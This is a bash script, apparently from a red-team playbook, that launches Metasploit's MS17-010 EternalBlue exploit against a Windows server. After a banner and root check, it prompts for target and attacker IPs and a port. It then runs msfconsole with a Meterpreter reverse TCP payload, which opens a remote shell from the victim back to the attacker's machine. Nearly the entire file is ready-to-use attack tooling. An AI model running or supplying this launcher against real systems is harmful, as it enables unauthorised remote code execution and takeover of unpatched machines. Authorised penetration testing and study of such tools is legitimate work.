#!/bin/bash

# =============================================================
# IRTx Red Team - EternalBlue MS17-010 Launcher
# DataBreach | Red Team Playbook
# =============================================================

RED='\033[0;31m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
RESET='\033[0m'

# --- Banner ---
echo -e "${RED}"
echo "  ███████╗████████╗███████╗██████╗ ███╗   ██╗ █████╗ ██╗      "
echo "  ██╔════╝╚══██╔══╝██╔════╝██╔══██╗████╗  ██║██╔══██╗██║      "
echo "  █████╗     ██║   █████╗  ██████╔╝██╔██╗ ██║███████║██║      "
echo "  ██╔══╝     ██║   ██╔══╝  ██╔══██╗██║╚██╗██║██╔══██║██║      "
echo "  ███████╗   ██║   ███████╗██║  ██║██║ ╚████║██║  ██║███████╗ "
echo "  ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝"
echo -e "${CYAN}          IRTx Red Team — MS17-010 EternalBlue Launcher${RESET}"
echo -e "${YELLOW}                      DataBreach${RESET}"
echo ""

# --- Privilege Check ---
if [[ $EUID -ne 0 ]]; then
  echo -e "${RED}[!] Run as root: sudo ./eternal.sh${RESET}"
  exit 1
fi

# --- msfconsole check ---
if ! command -v msfconsole &> /dev/null; then
  echo -e "${RED}[!] msfconsole not found. Run update.sh first.${RESET}"
  exit 1
fi

echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}${YELLOW}  MS17-010 EternalBlue — SMB Remote Code Execution${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""

# --- Input prompts ---
echo -e "${YELLOW}[?] Enter Windows Server IP ${BOLD}(RHOST)${RESET}${YELLOW}:${RESET}"
read -r TARGET

echo ""
echo -e "${YELLOW}[?] Enter your Kali IP ${BOLD}(LHOST)${RESET}${YELLOW}:${RESET}"
read -r LHOST

echo ""
echo -e "${YELLOW}[?] Enter LPORT ${BOLD}(default: 4444)${RESET}${YELLOW}:${RESET}"
read -r LPORT
LPORT=${LPORT:-4444}

# --- Confirm before launch ---
echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}  Confirm Attack Configuration:${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "  ${YELLOW}Target  (RHOST) :${RESET} ${BOLD}${RED}$TARGET${RESET}"
echo -e "  ${YELLOW}Attacker (LHOST):${RESET} ${BOLD}${GREEN}$LHOST${RESET}"
echo -e "  ${YELLOW}Port    (LPORT) :${RESET} ${BOLD}${CYAN}$LPORT${RESET}"
echo -e "  ${YELLOW}Exploit         :${RESET} exploit/windows/smb/ms17_010_eternalblue"
echo -e "  ${YELLOW}Payload         :${RESET} windows/x64/meterpreter/reverse_tcp"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
echo -e "${YELLOW}[?] Launch exploit? ${BOLD}(y/n)${RESET}${YELLOW}:${RESET}"
read -r CONFIRM

if [[ "$CONFIRM" != "y" && "$CONFIRM" != "Y" ]]; then
  echo ""
  echo -e "${RED}[!] Aborted.${RESET}"
  exit 0
fi

# --- Launch ---
echo ""
echo -e "${MAGENTA}[>] Launching msfconsole...${RESET}"
echo ""

msfconsole -q -x "
use exploit/windows/smb/ms17_010_eternalblue;
set RHOSTS $TARGET;
set LHOST $LHOST;
set LPORT $LPORT;
set PAYLOAD windows/x64/meterpreter/reverse_tcp;
exploit;
"
